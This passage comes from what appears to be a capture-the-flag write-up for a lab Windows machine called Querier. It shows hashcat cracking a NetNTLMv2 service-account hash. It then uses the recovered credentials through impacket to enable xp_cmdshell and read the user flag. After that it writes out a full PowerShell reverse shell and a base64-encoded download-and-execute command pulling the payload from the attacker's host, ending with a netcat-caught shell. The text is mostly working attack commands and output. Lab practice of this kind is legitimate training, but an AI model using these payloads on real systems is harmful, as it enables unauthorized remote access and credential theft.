Maximum password length supported by kernel: 256

ATTENTION! Pure (unoptimized) OpenCL kernels selected.
This enables cracking passwords and salts > length 32 but for the price of drastically reduced performance.
If you want to switch to optimized OpenCL kernels, append -O to your commandline.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

* Device #1: build_opts '-cl-std=CL1.2 -I OpenCL -I /usr/share/hashcat/OpenCL -D VENDOR_ID=64 -D CUDA_ARCH=0 -D AMD_ROCM=0 -D VECT_SIZE=8 -D DEVICE_TYPE=2 -D DGST_R0=0 -D DGST_R1=3 -D DGST_R2=2 -D DGST_R3=1 -D DGST_ELEM=4 -D KERN_TYPE=5600 -D _unroll'
Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Type........: NetNTLMv2
Hash.Target......: MSSQL-SVC::QUERIER:4141414141414141:ad71c7f5171a8b2...000000
Time.Started.....: Thu Mar 21 00:33:25 2019 (20 secs)
Time.Estimated...: Thu Mar 21 00:33:45 2019 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.Dev.#1.....:   450.3 kH/s (3.88ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 8960000/14344385 (62.46%)
Rejected.........: 0/8960000 (0.00%)
Restore.Point....: 8957952/14344385 (62.45%)
Candidates.#1....: correita.54 -> cornbread3
HWMon.Dev.#1.....: N/A

Started: Thu Mar 21 00:33:25 2019
Stopped: Thu Mar 21 00:33:46 2019
root@kali:~/Desktop/querier# cat cracked.txt 
MSSQL-SVC::QUERIER:4141414141414141:061ef1dbb08d51bf2d6c699d0a183db0:010100000000000080a501fe9cdfd401696e430f7b7dcc5c000000000100100056006a0045007200520049006b007800020010006d00420045004700590065004a0075000300100056006a0045007200520049006b007800040010006d00420045004700590065004a0075000700080080a501fe9cdfd4010600040002000000080030003000000000000000000000000030000010ea944b4c0be8993066b2d94663f632f30e06ad6e435553aea7fafc606510750a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310032002e0032003500000000000000000000000000:corporate568
root@kali:~/Desktop/querier#
```

Nice! We got new credentials `MSSQL-SVC/corporate568`. Lets use these new credentials to connect to the SQL database as an elevated user (now we are using `xp_cmdshell` to execute commands https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-2017):

```bash
root@kali:~/Desktop/querier# ./impacket/examples/mssqlclient.py mssql-svc:corporate568@10.10.10.125 -debug -windows-auth
Impacket v0.9.19-dev - Copyright 2019 SecureAuth Corporation

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: None, New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(QUERIER): Line 1: Changed database context to 'master'.
[*] INFO(QUERIER): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
[!] Press help for extra shell commands
SQL> help

     lcd {path}                 - changes the current local directory to {path}
     exit                       - terminates the server process (and this session)
     enable_xp_cmdshell         - you know what it means
     disable_xp_cmdshell        - you know what it means
     xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
     sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
     ! {cmd}                    - executes a local shell cmd
     
SQL> xp_cmdshell dir
[-] ERROR(QUERIER): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of the security configuration for this server. A system administrator can enable the use of 'xp_cmdshell' by using sp_configure. For more information about enabling 'xp_cmdshell', search for 'xp_cmdshell' in SQL Server Books Online.
SQL> enable_xp_cmdshell
[*] INFO(QUERIER): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
[*] INFO(QUERIER): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL> xp_cmdshell "dir c:\users\"
output                                                                             
--------------------------------------------------------------------------------   
 Volume in drive C has no label.                                                   
 Volume Serial Number is FE98-F373                                                 
NULL                                                                               
 Directory of c:\users                                                             
NULL                                                                               
01/28/2019  11:41 PM    <DIR>          .                                           
01/28/2019  11:41 PM    <DIR>          ..                                          
01/28/2019  10:17 PM    <DIR>          Administrator                               
01/28/2019  11:42 PM    <DIR>          mssql-svc                                   
01/28/2019  10:17 PM    <DIR>          Public                                      
               0 File(s)              0 bytes                                      
               5 Dir(s)   6,546,616,320 bytes free                                 
NULL                                                                               
SQL> xp_cmdshell "dir c:\users\mssql-svc\"
output                                                                             
--------------------------------------------------------------------------------   
 Volume in drive C has no label.                                                   
 Volume Serial Number is FE98-F373                                                 
NULL                                                                               
 Directory of c:\users\mssql-svc                                                   
NULL                                                                               
01/28/2019  11:42 PM    <DIR>          .                                           
01/28/2019  11:42 PM    <DIR>          ..                                          
01/28/2019  11:42 PM    <DIR>          3D Objects                                  
01/28/2019  11:42 PM    <DIR>          Contacts                                    
01/28/2019  11:42 PM    <DIR>          Desktop                                     
01/28/2019  11:42 PM    <DIR>          Documents                                   
01/28/2019  11:42 PM    <DIR>          Downloads                                   
01/28/2019  11:42 PM    <DIR>          Favorites                                   
01/28/2019  11:42 PM    <DIR>          Links                                       
01/28/2019  11:42 PM    <DIR>          Music                                       
01/28/2019  11:42 PM    <DIR>          Pictures                                    
01/28/2019  11:42 PM    <DIR>          Saved Games                                 
01/28/2019  11:42 PM    <DIR>          Searches                                    
01/28/2019  11:42 PM    <DIR>          Videos                                      
               0 File(s)              0 bytes                                      
              14 Dir(s)   6,546,616,320 bytes free                                 
NULL                                                                               
SQL> xp_cmdshell "dir c:\users\mssql-svc\Desktop"
output                                                                             
--------------------------------------------------------------------------------   
 Volume in drive C has no label.                                                   
 Volume Serial Number is FE98-F373                                                 
NULL                                                                               
 Directory of c:\users\mssql-svc\Desktop                                           
NULL                                                                               
01/28/2019  11:42 PM    <DIR>          .                                           
01/28/2019  11:42 PM    <DIR>          ..                                          
01/28/2019  12:08 AM                33 user.txt                                    
               1 File(s)             33 bytes                                      
               2 Dir(s)   6,546,616,320 bytes free                                 
NULL                                                                               
SQL> xp_cmdshell "type c:\users\mssql-svc\Desktop\user.txt"
output                                                                             
--------------------------------------------------------------------------------   
c37b41bb669da345bb14de50faab3c16                                                   
NULL                                                                               
SQL> xp_cmdshell "dir c:\users\Administrator\"
output                                                                             
--------------------------------------------------------------------------------   
 Volume in drive C has no label.                                                   
 Volume Serial Number is FE98-F373                                                 
NULL                                                                               
 Directory of c:\users\Administrator                                               
NULL                                                                               
File Not Found                                                                     
NULL                                                                               
SQL>
```

## `user.txt`:

Well thats user! but not root :( Lets elevate our access to a more reliable PowerShell shell:

```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.12.7',443);
$stream = $client.GetStream();
$bytes = new-object System.Byte[] 65535;
while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
 $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);
 $sendback = (iex $data 2>&1 | Out-String);
 $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
 $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
 $stream.Write($sendbyte, 0, $sendbyte.Length);
 $stream.Flush();
};
$client.Close();
```

We will host this payload using a python HTTP server and then ask for the target to fetch and execute this script. Here is our encoded command to fetch this payload:

```bash
Aarons-MacBook-Pro:~ aaron$ python
Python 3.7.2 (default, Jan 13 2019, 12:50:01)
[Clang 10.0.0 (clang-1000.11.45.5)] on darwin
Type "help", "copyright", "credits" or "license" for more information.
>>> import base64
>>> s = "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://10.10.12.7:8000/p.ps1')"
>>> base64.b64encode(s.encode("UTF-16-LE"))
b'SQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEAMgAuADcAOgA4ADAAMAAwAC8AcAAuAHAAcwAxACcAKQA='
```

Now we will execute it on the host:

```bash
root@kali:~/Desktop/querier# ./impacket/examples/mssqlclient.py mssql-svc:corporate568@10.10.10.125 -debug -windows-auth
Impacket v0.9.19-dev - Copyright 2019 SecureAuth Corporation

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: None, New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(QUERIER): Line 1: Changed database context to 'master'.
[*] INFO(QUERIER): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
[!] Press help for extra shell commands
SQL> enable_xp_cmdshell
[*] INFO(QUERIER): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
[*] INFO(QUERIER): Line 185: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.
SQL> xp_cmdshell "powershell.exe -encodedCommand SQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEAMgAuADcAOgA4ADAAMAAwAC8AcAAuAHAAcwAxACcAKQA="
```

And here is our hosted server to serve the payload:

```bash
root@kali:~/Desktop/querier# python -m SimpleHTTPServer
Serving HTTP on 0.0.0.0 port 8000 ...
10.10.10.125 - - [24/Mar/2019 23:59:17] "GET /p.ps1 HTTP/1.1" 200 -
```

And here is our shell connection:

```bash
root@kali:~/Desktop/querier# nc -nvlp 443
listening on [any] 443 ...
connect to [10.10.12.7] from (UNKNOWN) [10.10.10.125] 49693

PS C:\Windows\system32> net user

User accounts for \\QUERIER

-------------------------------------------------------------------------------
Administrator            DefaultAccount           Guest                    
mssql-svc                reporting                WDAGUtilityAccount       
The command completed successfully.

PS C:\Windows\system32>
```

Now lets do some more host enumeration. 

## `root.txt`:

TODO

```sql
SELECT sobjects.name FROM sysobjects sobjects WHERE sobjects.xtype = 'U'
```